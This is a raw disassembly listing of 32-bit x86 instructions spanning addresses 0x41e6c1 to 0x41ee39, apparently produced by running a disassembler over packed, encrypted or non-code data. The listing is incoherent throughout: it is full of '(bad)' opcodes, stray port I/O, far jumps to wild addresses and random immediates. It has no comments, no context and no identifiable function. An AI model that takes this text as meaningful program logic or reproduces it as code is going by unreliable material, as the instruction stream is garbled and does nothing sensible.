  41e6c1:	inc    esp
  41e6c2:	retf   0xe459
  41e6c5:	(bad)  
  41e6c6:	cmc    
  41e6c7:	jno    0x41e66c
  41e6c9:	jno    0x41e748
  41e6cb:	scas   al,BYTE PTR es:[edi]
  41e6cc:	lock mov bl,0x3e
  41e6cf:	pop    ecx
  41e6d0:	pop    esi
  41e6d1:	adc    DWORD PTR [ebx+0x2f],edx
  41e6d4:	aad    0xd6
  41e6d6:	inc    eax
  41e6d7:	das    
  41e6d8:	pop    ss
  41e6d9:	mov    eax,ds:0x819fc6c5
  41e6de:	sub    dh,cl
  41e6e0:	in     eax,0xc8
  41e6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e3:	inc    ebp
  41e6e4:	test   eax,0x5947c029
  41e6e9:	test   BYTE PTR [ecx+eax*8+0xea067a0],ch
  41e6f0:	lock sub BYTE PTR [ebx],dh
  41e6f3:	test   al,0xea
  41e6f5:	arpl   WORD PTR [ebx-0x73],sp
  41e6f8:	mov    esi,0x2a8e177e
  41e6fd:	cmp    ecx,DWORD PTR [ecx-0x371f41b5]
  41e703:	and    DWORD PTR [edi+0x28],eax
  41e706:	push   cs
  41e707:	mov    edx,0x4bfc8df
  41e70c:	add    BYTE PTR [edx+ecx*1-0x3bcf1ce2],bh
  41e713:	add    DWORD PTR [esi-0xd1000b3],edx
  41e719:	cld    
  41e71a:	pop    ss
  41e71b:	mov    ch,0xc4
  41e71d:	jmp    0xe4dd917f
  41e722:	inc    DWORD PTR [eax-0x2be19ac9]
  41e728:	loope  0x41e765
  41e72a:	sbb    al,0x12
  41e72c:	sar    BYTE PTR [esi-0x26],1
  41e72f:	out    dx,eax
  41e730:	push   ds
  41e731:	outs   dx,DWORD PTR ds:[esi]
  41e732:	ficomp WORD PTR [ebp-0x30a24a08]
  41e738:	daa    
  41e739:	inc    esp
  41e73a:	inc    ebx
  41e73b:	popa   
  41e73c:	(bad)  
  41e740:	dec    edx
  41e741:	pop    eax
  41e742:	pop    ecx
  41e743:	addr16 sets bl
  41e747:	pop    es
  41e748:	dec    edi
  41e749:	add    al,0xf2
  41e74b:	sub    bl,BYTE PTR [esi]
  41e74d:	xor    DWORD PTR [ebp-0x38f434dd],esp
  41e753:	data16 mov cl,0x67
  41e756:	fyl2x  
  41e758:	sub    DWORD PTR [eax+0x2cd5f879],edi
  41e75e:	mov    BYTE PTR [ecx],0x17
  41e761:	imul   edi,DWORD PTR [esi+0x618a3cb1],0x138a96e3
  41e76b:	popf   
  41e76c:	push   cs
  41e76d:	adc    al,0x41
  41e76f:	jmp    FWORD PTR ds:0x23a457b3
  41e775:	lds    esp,FWORD PTR [edi+0x2ea8bd3f]
  41e77b:	dec    ebx
  41e77c:	fild   QWORD PTR [ebp-0x30]
  41e77f:	cdq    
  41e780:	lds    eax,FWORD PTR [edx]
  41e782:	sub    edi,0xffffffa1
  41e785:	clc    
  41e786:	fdiv   st(6),st
  41e788:	xchg   esi,eax
  41e789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e78a:	int3   
  41e78b:	cmp    al,0xf7
  41e78d:	sbb    eax,0xcaff1ab7
  41e792:	adc    al,0xa0
  41e794:	hlt    
  41e795:	push   esi
  41e796:	ret    
  41e797:	xchg   edx,eax
  41e798:	fwait
  41e799:	adc    al,0x14
  41e79b:	inc    edi
  41e79c:	mov    es,WORD PTR [edi-0x202b4c1b]
  41e7a2:	cmp    bh,0xb9
  41e7a5:	loopne 0x41e826
  41e7a7:	daa    
  41e7a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7a9:	dec    edx
  41e7aa:	jne    0x41e7ec
  41e7ac:	dec    esi
  41e7ad:	inc    edx
  41e7ae:	mov    al,ds:0x88ff0bb0
  41e7b3:	bound  edi,QWORD PTR [ebx]
  41e7b5:	mov    cl,ah
  41e7b7:	cld    
  41e7b8:	jns    0xc018c65e
  41e7be:	imul   ebx,edi,0x4f
  41e7c1:	adc    eax,DWORD PTR [edx-0x6b]
  41e7c4:	cld    
  41e7c5:	mov    ebp,0xa123f7d1
  41e7ca:	js     0x41e82f
  41e7cc:	and    DWORD PTR [ecx-0x67ecf66],ecx
  41e7d2:	les    edx,FWORD PTR [esp+esi*4]
  41e7d5:	mov    ch,BYTE PTR [ecx-0x7d7e05f2]
  41e7db:	push   ss
  41e7dc:	pop    ebx
  41e7dd:	mov    ebp,0x2a36ee86
  41e7e2:	(bad)  
  41e7e3:	pop    esp
  41e7e4:	lahf   
  41e7e5:	and    edx,DWORD PTR [ebp-0x23]
  41e7e8:	scas   eax,DWORD PTR es:[edi]
  41e7e9:	cs test ah,cl
  41e7ec:	cli    
  41e7ed:	das    
  41e7ee:	mov    bh,0xbf
  41e7f0:	rol    BYTE PTR [eax+0x21],1
  41e7f3:	jecxz  0x41e858
  41e7f5:	mov    esi,0x2a63b73d
  41e7fa:	ds pop esp
  41e7fc:	sub    eax,0x24cf1bec
  41e801:	in     al,dx
  41e802:	loope  0x41e832
  41e804:	loope  0x41e84f
  41e806:	xchg   ecx,eax
  41e807:	push   es
  41e808:	ror    BYTE PTR [ecx],0x5
  41e80b:	jmp    0x41e853
  41e80d:	in     eax,0x97
  41e80f:	inc    esp
  41e810:	pop    es
  41e811:	loope  0x41e85e
  41e813:	scas   al,BYTE PTR es:[edi]
  41e814:	or     bl,BYTE PTR [esi-0x6c]
  41e817:	sub    ecx,0xd20a99ca
  41e81d:	mov    ebp,0xd43c7b0d
  41e822:	xchg   esp,eax
  41e823:	bound  eax,QWORD PTR [eax-0x2]
  41e826:	scas   al,BYTE PTR es:[edi]
  41e827:	or     eax,0xcf5f6105
  41e82c:	fmul   DWORD PTR [eax+0x54]
  41e82f:	sub    al,0xf8
  41e831:	enter  0x11d7,0x42
  41e835:	cmp    eax,0x64c73058
  41e83a:	ss fs es cld 
  41e83e:	push   edi
  41e83f:	rol    ebx,cl
  41e841:	nop
  41e842:	cdq    
  41e843:	pop    ss
  41e844:	scas   eax,DWORD PTR es:[edi]
  41e845:	jb     0x41e85b
  41e847:	mov    bl,0x69
  41e849:	mov    edi,0x8642b687
  41e84e:	sahf   
  41e84f:	xchg   ecx,eax
  41e850:	pop    esi
  41e851:	sub    al,0x54
  41e853:	pop    ss
  41e854:	or     eax,0x3fd870a3
  41e85a:	inc    ebx
  41e85b:	scas   al,BYTE PTR es:[edi]
  41e85c:	pop    DWORD PTR [ebp+0x32]
  41e85f:	push   ebp
  41e860:	hlt    
  41e861:	(bad)  
  41e862:	jo     0x41e8c6
  41e864:	int    0x3f
  41e866:	fcomi  st,st(5)
  41e868:	or     BYTE PTR [edi+esi*8],0x9b
  41e86c:	hlt    
  41e86d:	sbb    dh,BYTE PTR [ebp+esi*1+0x5f4d3a74]
  41e874:	inc    esp
  41e875:	mov    ch,0xa7
  41e877:	lea    ecx,[edi+0x23]
  41e87a:	inc    edx
  41e87b:	pusha  
  41e87c:	xchg   DWORD PTR [ebp+0x2f300036],edi
  41e882:	cdq    
  41e883:	inc    edi
  41e884:	mov    WORD PTR [edi+0x64],es
  41e887:	and    BYTE PTR [ebx],al
  41e889:	or     eax,0x62c9082f
  41e88e:	not    DWORD PTR [bp+di-0x6c35]
  41e893:	pop    ecx
  41e894:	sub    edx,DWORD PTR [eax+esi*4-0x21]
  41e898:	popf   
  41e899:	jecxz  0x41e897
  41e89b:	and    al,BYTE PTR ds:0x6e4d1f1a
  41e8a1:	and    DWORD PTR [edx-0x6ee7af35],esp
  41e8a7:	sar    al,cl
  41e8a9:	push   edx
  41e8aa:	lods   eax,DWORD PTR ds:[esi]
  41e8ab:	add    ebx,ebx
  41e8ad:	xor    esp,DWORD PTR [eax-0x78a07166]
  41e8b3:	inc    ebp
  41e8b4:	in     al,0x13
  41e8b6:	push   ss
  41e8b7:	push   edi
  41e8b8:	fcomi  st,st(2)
  41e8ba:	or     eax,0x967d22af
  41e8bf:	sbb    al,0x4d
  41e8c1:	cmc    
  41e8c2:	xor    eax,0xa6f1cff
  41e8c7:	scas   al,BYTE PTR es:[edi]
  41e8c8:	cdq    
  41e8c9:	add    al,0xce
  41e8cb:	rol    BYTE PTR [ebx],0x63
  41e8ce:	xchg   edx,eax
  41e8cf:	push   0x3e
  41e8d1:	(bad)  
  41e8d2:	shl    DWORD PTR [ecx-0x10],cl
  41e8d5:	add    eax,ecx
  41e8d7:	push   ds
  41e8d8:	add    bh,ah
  41e8da:	or     dh,bl
  41e8dc:	push   cs
  41e8dd:	sahf   
  41e8de:	popf   
  41e8df:	push   esi
  41e8e0:	fstp   st(5)
  41e8e2:	push   eax
  41e8e3:	cmp    ch,BYTE PTR [ecx]
  41e8e5:	not    DWORD PTR [ebx]
  41e8e7:	add    ah,bh
  41e8e9:	in     al,0xbf
  41e8eb:	inc    ebp
  41e8ec:	je     0x41e8a8
  41e8ee:	push   es
  41e8ef:	push   ebp
  41e8f0:	inc    edi
  41e8f1:	in     eax,dx
  41e8f2:	inc    ebx
  41e8f3:	sub    eax,0x64d4e9f
  41e8f8:	into   
  41e8f9:	(bad)  
  41e8fa:	fild   WORD PTR [ecx-0x3542d012]
  41e900:	shl    DWORD PTR [ebp-0x48ab4a8a],cl
  41e906:	mov    ch,0xb8
  41e908:	push   ds
  41e909:	push   ds
  41e90a:	cmc    
  41e90b:	test   ebp,esp
  41e90d:	inc    eax
  41e90e:	fidiv  DWORD PTR [ebx+0x24]
  41e911:	js     0x41e8fb
  41e913:	jmp    0xd3c31eb
  41e918:	dec    ebx
  41e919:	dec    edx
  41e91a:	ja     0x41e96c
  41e91c:	sbb    eax,0x2ef66cf
  41e921:	fdiv   st,st(1)
  41e923:	sub    BYTE PTR [esi+0x7814e5c3],ah
  41e929:	xor    dl,dh
  41e92b:	jp     0x41e91b
  41e92d:	loopne 0x41e8b5
  41e92f:	clc    
  41e930:	dec    ecx
  41e931:	lahf   
  41e932:	nop
  41e933:	push   esi
  41e934:	mov    WORD PTR [eax],ss
  41e936:	xor    eax,0xed230a5
  41e93b:	test   BYTE PTR [ebx],cl
  41e93d:	and    eax,0x31373cde
  41e942:	inc    ebx
  41e943:	ret    
  41e944:	shr    BYTE PTR [ebx+0x1a],cl
  41e947:	aad    0xa3
  41e949:	push   ebx
  41e94a:	call   0x79473ad6
  41e94f:	dec    ecx
  41e950:	sbb    eax,0xf69521f5
  41e955:	add    bl,BYTE PTR [edx+eiz*1]
  41e958:	loope  0x41e9c5
  41e95a:	in     eax,dx
  41e95b:	pop    edx
  41e95c:	pop    es
  41e95d:	std    
  41e95e:	gs in  al,dx
  41e960:	mov    DWORD PTR [eax],ebp
  41e962:	sbb    cl,bh
  41e964:	cmp    eax,0xce272aa
  41e969:	(bad)  
  41e96a:	sti    
  41e96b:	xchg   esp,eax
  41e96c:	in     eax,0xcb
  41e96e:	ss inc eax
  41e970:	xor    bl,ch
  41e972:	repz cmp esi,eax
  41e975:	or     dl,ah
  41e977:	ds retf 0x41ed
  41e97b:	pop    edx
  41e97c:	cmp    DWORD PTR ds:0xbb987af2,0x1a2b02ba
  41e986:	repz adc al,0xcb
  41e989:	out    0x86,al
  41e98b:	push   ebx
  41e98c:	das    
  41e98d:	pop    es
  41e98e:	or     BYTE PTR [eax+esi*1],ah
  41e991:	mov    ds:0x412be9b4,eax
  41e996:	jae    0x41e9fd
  41e998:	enter  0xabf2,0x32
  41e99c:	int    0xf9
  41e99e:	add    DWORD PTR [ebp+0x3c2db671],0x20
  41e9a5:	retf   
  41e9a6:	cmc    
  41e9a7:	retf   
  41e9a8:	jno    0x41e9af
  41e9aa:	push   0x3dcd3305
  41e9af:	or     DWORD PTR [edx+0x1f],ebp
  41e9b2:	imul   edx,edx,0xfffffff0
  41e9b5:	add    BYTE PTR [esp+ebx*2],0xea
  41e9b9:	or     al,0x23
  41e9bb:	bound  eax,QWORD PTR [edi+eiz*4]
  41e9be:	daa    
  41e9bf:	dec    esi
  41e9c0:	cmp    ah,BYTE PTR [esi]
  41e9c2:	mov    bh,0xed
  41e9c4:	(bad)  
  41e9c5:	push   esi
  41e9c6:	pminub mm7,mm2
  41e9c9:	and    edi,ebp
  41e9cb:	jbe    0x41ea0e
  41e9cd:	int    0x3f
  41e9cf:	pop    esp
  41e9d0:	add    DWORD PTR [eax],esi
  41e9d2:	iret   
  41e9d3:	test   DWORD PTR [edx-0x16e0cfe6],0xd88cff7b
  41e9dd:	into   
  41e9de:	ds sbb eax,0xfef6e7ab
  41e9e4:	cmc    
  41e9e5:	mov    DWORD PTR [ebx],edi
  41e9e7:	add    BYTE PTR [ebp+0x57ff677d],0xb2
  41e9ee:	popf   
  41e9ef:	bound  esp,QWORD PTR [esi+0x7821727c]
  41e9f5:	push   ds
  41e9f6:	sub    eax,0xabd50ad1
  41e9fb:	jge    0x41ea2b
  41e9fd:	icebp  
  41e9fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ff:	push   ebp
  41ea00:	pop    ds
  41ea01:	out    0xf4,eax
  41ea03:	mov    esp,0x411fefe5
  41ea08:	cs mov esi,0x3a84ce8e
  41ea0e:	xchg   esp,eax
  41ea0f:	xchg   ebx,eax
  41ea10:	iret   
  41ea11:	mov    eax,ds:0x46479c23
  41ea16:	dec    eax
  41ea17:	pop    ds
  41ea18:	mov    eax,ds:0x43b5d6d5
  41ea1d:	or     ebx,0x1e9eadc2
  41ea23:	dec    eax
  41ea24:	pop    eax
  41ea25:	push   ss
  41ea26:	loop   0x41ea6b
  41ea28:	and    edx,DWORD PTR [edx-0x6581adc5]
  41ea2e:	xchg   ebp,eax
  41ea2f:	xor    al,0x52
  41ea31:	cmp    ebp,DWORD PTR [esp+0x45db101]
  41ea38:	sub    edi,esp
  41ea3a:	(bad)  
  41ea3b:	or     BYTE PTR [ebx-0x37],ah
  41ea3e:	aam    0x79
  41ea40:	mov    eax,ds:0xfe99836f
  41ea45:	aaa    
  41ea46:	stc    
  41ea47:	test   eax,0x46978ac
  41ea4c:	call   0x6f3c:0xbf8450b2
  41ea53:	inc    ebx
  41ea54:	xor    al,0x94
  41ea56:	or     al,0x10
  41ea58:	pusha  
  41ea59:	out    dx,al
  41ea5a:	fistp  QWORD PTR [ebp+0x25]
  41ea5d:	jne    0x41eaa9
  41ea5f:	aam    0x6d
  41ea61:	xchg   edi,eax
  41ea62:	mov    dh,0xd6
  41ea64:	mov    DWORD PTR [ecx-0x4853a690],ecx
  41ea6a:	cdq    
  41ea6b:	push   0x23
  41ea6d:	je     0x41eadc
  41ea6f:	pop    ebx
  41ea70:	cs pop eax
  41ea72:	adc    ebx,DWORD PTR [edi-0x20ff9566]
  41ea78:	mov    dl,0x4
  41ea7a:	fidivr DWORD PTR [edx]
  41ea7c:	icebp  
  41ea7d:	cdq    
  41ea7e:	push   ecx
  41ea7f:	push   esp
  41ea80:	cmp    BYTE PTR [edx+0x17],ch
  41ea83:	stos   DWORD PTR es:[edi],eax
  41ea84:	push   ecx
  41ea85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea86:	xor    bh,0x6
  41ea89:	jmp    0x41eb04
  41ea8b:	fst    DWORD PTR [edx]
  41ea8d:	shl    esi,cl
  41ea8f:	imul   eax
  41ea91:	jle    0x41eaee
  41ea93:	inc    esp
  41ea94:	dec    eax
  41ea95:	adc    BYTE PTR [edx-0x23],al
  41ea98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea9a:	mov    ebp,0x8d58b054
  41ea9f:	imul   ecx,DWORD PTR [ebp+0x64a7e4af],0xcf5a6ca7
  41eaa9:	test   eax,0x7d386a5
  41eaae:	xor    DWORD PTR [ebx-0x1f40771f],0xeb9350b8
  41eab8:	adc    eax,DWORD PTR [eax]
  41eaba:	mov    eax,ds:0xe94ed932
  41eabf:	or     esp,DWORD PTR [eax]
  41eac1:	ret    0x4846
  41eac4:	ficom  WORD PTR [eax+0x26f57e4b]
  41eaca:	scas   eax,DWORD PTR es:[edi]
  41eacb:	outs   dx,BYTE PTR ds:[esi]
  41eacc:	xchg   edx,eax
  41eacd:	sti    
  41eace:	dec    ecx
  41eacf:	ret    0x5b67
  41ead2:	xchg   edx,eax
  41ead3:	(bad)  
  41ead4:	mov    eax,ds:0xbdba44e1
  41ead9:	mov    BYTE PTR [esi],ch
  41eadb:	and    eax,0x1fd39853
  41eae0:	push   edx
  41eae1:	data16 mov WORD PTR [ebx-0x4efa105c],ss
  41eae8:	and    edx,DWORD PTR [ecx-0x7eb3c5ca]
  41eaee:	mov    eax,ds:0xde6b58aa
  41eaf3:	sbb    al,0x3
  41eaf5:	jns    0x41eab7
  41eaf7:	jb     0x41eaef
  41eaf9:	push   ds
  41eafa:	sbb    edx,0x1f
  41eafd:	dec    ebp
  41eafe:	cwde   
  41eaff:	sbb    DWORD PTR [ebx+0x2e],ecx
  41eb02:	outs   dx,BYTE PTR ds:[esi]
  41eb03:	inc    BYTE PTR [edi]
  41eb05:	aam    0x7c
  41eb07:	pushf  
  41eb08:	das    
  41eb09:	retf   
  41eb0a:	push   ebp
  41eb0b:	adc    ah,dl
  41eb0d:	xor    ah,dh
  41eb0f:	jns    0x41ea9c
  41eb11:	mov    ebp,0xc09df76c
  41eb16:	lahf   
  41eb17:	aam    0x61
  41eb19:	popa   
  41eb1a:	mov    dh,0xf6
  41eb1c:	repz xor BYTE PTR ds:0xbc706f40,0xa3
  41eb24:	imul   edx,DWORD PTR [eiz*8-0x1649bf59],0xa6471571
  41eb2f:	in     al,dx
  41eb30:	call   esi
  41eb32:	inc    eax
  41eb33:	jmp    FWORD PTR ds:0xaefb6ea3
  41eb39:	test   DWORD PTR [edx+0x1b271982],0xb2f82c19
  41eb43:	(bad)  
  41eb44:	xor    al,0xf7
  41eb46:	fs cmp dl,dl
  41eb49:	cwde   
  41eb4a:	(bad)  
  41eb4b:	icebp  
  41eb4c:	push   0x32719359
  41eb51:	mov    eax,0x90e4f58d
  41eb56:	daa    
  41eb57:	jecxz  0x41eb82
  41eb59:	arpl   WORD PTR [esi-0x588dc61a],ax
  41eb5f:	cmp    DWORD PTR [edx],0x9134740e
  41eb65:	mov    eax,0x55e02473
  41eb6a:	out    dx,eax
  41eb6b:	idiv   BYTE PTR [edx-0x66a83e93]
  41eb71:	inc    edx
  41eb72:	or     bl,0x34
  41eb75:	mov    cl,0x71
  41eb77:	sbb    eax,esi
  41eb79:	repz and DWORD PTR [eax-0x1f89fc5d],0xedcdb13f
  41eb84:	push   ecx
  41eb85:	lods   eax,DWORD PTR ds:[esi]
  41eb86:	jmp    0xc31b:0xef009122
  41eb8d:	push   esp
  41eb8e:	out    0xab,al
  41eb90:	or     al,cl
  41eb92:	sub    DWORD PTR [esi-0x50],ebx
  41eb95:	adc    esi,eax
  41eb97:	sar    BYTE PTR [ebx+0x7a9f58e2],0xbf
  41eb9e:	inc    ebx
  41eb9f:	(bad)  
  41eba0:	cld    
  41eba1:	mov    bh,0x76
  41eba3:	rol    DWORD PTR [eax+0x6c9759f4],cl
  41eba9:	add    cl,dh
  41ebab:	adc    cl,ch
  41ebad:	push   ds
  41ebae:	push   0x65
  41ebb0:	mov    dl,0xcf
  41ebb2:	fisub  DWORD PTR [edx-0x69]
  41ebb5:	pop    edx
  41ebb6:	or     al,0x95
  41ebb8:	mov    esi,0xf6a70bed
  41ebbd:	dec    esi
  41ebbe:	ja     0x41eb7e
  41ebc0:	cdq    
  41ebc1:	and    bl,BYTE PTR [edx-0x1]
  41ebc4:	in     al,dx
  41ebc5:	(bad)  
  41ebc6:	ja     0x41eb5b
  41ebc8:	xor    eax,0x31f8ea5f
  41ebcd:	inc    ebp
  41ebce:	sub    eax,DWORD PTR [edi+0x26aff0d0]
  41ebd4:	rol    BYTE PTR [ecx+0x2],0xfd
  41ebd8:	adc    eax,0x18073da
  41ebdd:	ins    BYTE PTR es:[edi],dx
  41ebde:	mov    edi,0x3ac297b4
  41ebe3:	lods   eax,DWORD PTR ds:[esi]
  41ebe4:	cwde   
  41ebe5:	(bad)  
  41ebe6:	out    dx,eax
  41ebe7:	test   BYTE PTR ds:0x816d0b3d,ch
  41ebed:	gs nop
  41ebef:	jo     0x41ebab
  41ebf1:	retf   0x2474
  41ebf4:	dec    ebp
  41ebf5:	es jno 0x41ebb6
  41ebf8:	stc    
  41ebf9:	mov    al,ds:0xc9b0a336
  41ebfe:	pusha  
  41ebff:	jnp    0x41ebda
  41ec01:	mov    bh,0xc3
  41ec03:	cwde   
  41ec04:	addr16 mov edx,0xb4ffe452
  41ec0a:	pop    edx
  41ec0b:	lahf   
  41ec0c:	cmp    DWORD PTR [ebx],0xb29ab5b4
  41ec12:	lahf   
  41ec13:	nop
  41ec14:	iret   
  41ec15:	pop    ebx
  41ec16:	and    bh,BYTE PTR [ebx+0x1c]
  41ec19:	clc    
  41ec1a:	jae    0x41ec36
  41ec1c:	neg    esi
  41ec1e:	cwde   
  41ec1f:	inc    ebp
  41ec20:	je     0x41ebeb
  41ec22:	sbb    ch,BYTE PTR [edi]
  41ec24:	into   
  41ec25:	push   es
  41ec26:	add    al,0x89
  41ec28:	inc    edi
  41ec29:	dec    eax
  41ec2a:	mov    WORD PTR [edi],fs
  41ec2c:	pop    edi
  41ec2d:	adc    DWORD PTR [ebx+eax*4],ecx
  41ec30:	and    eax,0x6e77acb1
  41ec35:	jns    0x41ebe2
  41ec37:	out    dx,eax
  41ec38:	inc    ecx
  41ec39:	mov    esp,0x6a589f2e
  41ec3e:	int    0x9b
  41ec40:	mov    ds:0x132e27e2,al
  41ec45:	and    bl,ah
  41ec47:	mov    edx,0x3e8f56ce
  41ec4c:	gs dec esi
  41ec4e:	and    eax,0x6905ad98
  41ec53:	stos   DWORD PTR es:[edi],eax
  41ec54:	bound  esp,QWORD PTR [ecx]
  41ec56:	(bad)  
  41ec57:	outs   dx,DWORD PTR es:[esi]
  41ec59:	pop    ss
  41ec5a:	popf   
  41ec5b:	ret    
  41ec5c:	ret    0x5c3f
  41ec5f:	addr16 mov esp,0xd1569ea4
  41ec65:	jne    0x41ec11
  41ec67:	mov    cs:0x68430ab2,eax
  41ec6d:	ret    0xba3a
  41ec70:	and    ecx,DWORD PTR [edi]
  41ec72:	sbb    al,0x1c
  41ec74:	shl    bl,cl
  41ec76:	mov    bl,0x55
  41ec78:	xchg   esi,eax
  41ec79:	mov    eax,ds:0xea7bbb42
  41ec7e:	scas   eax,DWORD PTR es:[edi]
  41ec7f:	mov    ds:0xd8701c61,eax
  41ec84:	mov    edi,0xe0271164
  41ec89:	cwde   
  41ec8a:	lods   eax,DWORD PTR ds:[esi]
  41ec8b:	and    DWORD PTR ds:0xfc6c0344,edi
  41ec91:	addr16 in al,dx
  41ec93:	fidivr WORD PTR [edx]
  41ec95:	pop    ebx
  41ec96:	xor    eax,0xd15c948d
  41ec9b:	cdq    
  41ec9c:	jb     0x41ed07
  41ec9e:	mov    ebp,0x871b4ac1
  41eca3:	xchg   esp,eax
  41eca4:	ins    DWORD PTR es:[edi],dx
  41eca5:	sahf   
  41eca6:	push   cs
  41eca7:	cmp    DWORD PTR [ebp-0x68],edx
  41ecaa:	cmp    DWORD PTR [esi],ebp
  41ecac:	les    esi,FWORD PTR [eax]
  41ecae:	cmp    edx,DWORD PTR [ebx]
  41ecb0:	scas   al,BYTE PTR es:[edi]
  41ecb1:	jo     0x41ec61
  41ecb3:	or     dh,BYTE PTR [eax]
  41ecb5:	shl    edi,1
  41ecb7:	push   0xe766a6ee
  41ecbc:	xlat   BYTE PTR ds:[ebx]
  41ecbd:	push   0xffffffd3
  41ecbf:	push   esi
  41ecc0:	pop    esi
  41ecc1:	add    dh,ah
  41ecc3:	cmp    al,0x21
  41ecc5:	inc    esp
  41ecc6:	nop
  41ecc7:	sub    BYTE PTR [eax+0x3d489acb],ah
  41eccd:	jae    0x41eca2
  41eccf:	stos   DWORD PTR es:[edi],eax
  41ecd0:	sub    edi,DWORD PTR [edi-0x17]
  41ecd3:	pop    ds
  41ecd4:	mov    esi,0xe1067f96
  41ecd9:	dec    esp
  41ecda:	add    ecx,DWORD PTR [ecx+0x1c]
  41ecdd:	sbb    al,0x7f
  41ecdf:	push   0xffffff94
  41ece1:	pop    ebx
  41ece2:	div    bh
  41ece4:	jb     0x41ec72
  41ece6:	dec    edx
  41ece7:	aam    0x6b
  41ece9:	xchg   BYTE PTR [edi-0x5f9abe53],al
  41ecef:	inc    ebp
  41ecf0:	shl    bh,1
  41ecf2:	add    al,0x10
  41ecf4:	push   0xffffffd5
  41ecf6:	int    0x24
  41ecf8:	ja     0x41eca9
  41ecfa:	push   es
  41ecfb:	cld    
  41ecfc:	pop    ecx
  41ecfd:	inc    edi
  41ecfe:	ins    BYTE PTR es:[edi],dx
  41ecff:	mov    eax,0xfbe99ef4
  41ed04:	cli    
  41ed05:	jne    0x41ed86
  41ed07:	mov    BYTE PTR [esi],bl
  41ed09:	cdq    
  41ed0a:	mov    bl,0x57
  41ed0c:	leave  
  41ed0d:	mov    al,0xf4
  41ed0f:	popa   
  41ed10:	sbb    ebx,esp
  41ed12:	es jle 0x41ecdf
  41ed15:	mov    bl,BYTE PTR [esi-0x49]
  41ed18:	sbb    al,0x8a
  41ed1a:	mov    ebx,0xad9875a9
  41ed1f:	cmp    BYTE PTR [eax-0x50fe5727],0xba
  41ed26:	adc    DWORD PTR [eax-0x48fe4cee],ebx
  41ed2c:	std    
  41ed2d:	shl    DWORD PTR [ebp-0x3c023925],1
  41ed33:	sbb    cl,bl
  41ed35:	lock cmp ecx,DWORD PTR [ebx+eax*1-0x47]
  41ed3a:	jle    0x41ed5f
  41ed3c:	sub    al,0x1e
  41ed3e:	scas   al,BYTE PTR es:[edi]
  41ed3f:	cwde   
  41ed40:	xchg   ebp,eax
  41ed41:	adc    bh,ch
  41ed43:	jno    0x41ed70
  41ed45:	jle    0x41ed5d
  41ed47:	and    eax,0x355b2b64
  41ed4c:	mov    esi,0x4464a3a7
  41ed51:	outs   dx,BYTE PTR ds:[esi]
  41ed52:	ds std 
  41ed54:	mov    ds:0x75d52add,al
  41ed59:	stos   BYTE PTR es:[edi],al
  41ed5a:	add    DWORD PTR ds:0xcf261b81,esp
  41ed60:	xor    ebx,DWORD PTR [eax+ebx*4]
  41ed63:	mov    cl,0x52
  41ed65:	aas    
  41ed66:	or     ecx,eax
  41ed68:	bnd jo 0x41ed85
  41ed6b:	add    DWORD PTR [ecx-0xc2d7dd5],esi
  41ed71:	cmp    esi,DWORD PTR [esi-0x73ef5233]
  41ed77:	sti    
  41ed78:	xchg   esp,eax
  41ed79:	sub    dh,al
  41ed7b:	mov    ecx,0xf939a66f
  41ed80:	jo     0x41ed73
  41ed82:	mov    ah,0x71
  41ed84:	fs add bl,ch
  41ed87:	cs int3 
  41ed89:	sub    DWORD PTR [esi-0x73ee0671],ebx
  41ed8f:	outs   dx,DWORD PTR ds:[esi]
  41ed90:	add    esi,DWORD PTR [edx+0x39]
  41ed93:	adc    eax,0xf0fb6792
  41ed98:	(bad)  
  41ed99:	ins    BYTE PTR es:[edi],dx
  41ed9a:	xlat   BYTE PTR ds:[ebx]
  41ed9b:	fisttp QWORD PTR [eax-0x6cf83d4b]
  41eda1:	and    dl,al
  41eda3:	push   ebp
  41eda4:	inc    esi
  41eda5:	pusha  
  41eda6:	stc    
  41eda7:	(bad)  
  41eda8:	call   0xcc28:0xc2c87211
  41edaf:	les    ebp,FWORD PTR [eax]
  41edb1:	lods   al,BYTE PTR cs:[esi]
  41edb3:	adc    DWORD PTR [ebp-0x20ef5f74],eax
  41edb9:	icebp  
  41edba:	adc    ebx,DWORD PTR [esi+0x5abca548]
  41edc0:	fst    QWORD PTR [esi-0x6257dae4]
  41edc6:	jne    0x41ee28
  41edc8:	nop
  41edc9:	aas    
  41edca:	dec    ebx
  41edcb:	mov    eax,0x5c8e9d9f
  41edd0:	fadd   DWORD PTR [ecx+0x5f]
  41edd3:	into   
  41edd4:	inc    eax
  41edd5:	mov    al,0x5b
  41edd7:	(bad)
  41edda:	aas    
  41eddb:	pushf  
  41eddc:	mov    ch,0x5a
  41edde:	in     eax,dx
  41eddf:	jno    0x41ee5b
  41ede1:	push   0x6845677b
  41ede6:	retf   0xdc46
  41ede9:	mov    BYTE PTR [ebx],cl
  41edeb:	jg     0x41edbc
  41eded:	push   ecx
  41edee:	xchg   ebp,eax
  41edef:	jo     0x41ee6d
  41edf1:	loop   0x41edc1
  41edf3:	jnp    0x41ed98
  41edf5:	pop    edi
  41edf6:	mov    ecx,0xade687c5
  41edfb:	iret   
  41edfc:	fwait
  41edfd:	adc    DWORD PTR [ecx-0x3d],esi
  41ee00:	sbb    al,0xf6
  41ee02:	add    eax,0x441e85f
  41ee07:	push   eax
  41ee08:	int    0xaa
  41ee0a:	in     al,dx
  41ee0b:	ins    BYTE PTR es:[edi],dx
  41ee0c:	mov    ebx,0x57b900d9
  41ee11:	or     al,0xff
  41ee13:	rol    BYTE PTR [edi+edx*4],cl
  41ee16:	enter  0x4b3e,0x9c
  41ee1a:	cwde   
  41ee1b:	push   es
  41ee1c:	iret   
  41ee1d:	push   ecx
  41ee1e:	mov    ds:0x708fcf9d,eax
  41ee23:	call   FWORD PTR [ebx+ebp*4]
  41ee26:	pop    esi
  41ee27:	imul   eax,DWORD PTR [ebp-0x64],0x70b191b9
  41ee2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee2f:	jbe    0x41ee3d
  41ee31:	sub    bh,dh
  41ee33:	dec    ebp
  41ee34:	scas   al,BYTE PTR es:[edi]
  41ee35:	adc    BYTE PTR [edi],cl
  41ee37:	xchg   ecx,eax
  41ee38:	(bad)  
  41ee39:	pop    ebp
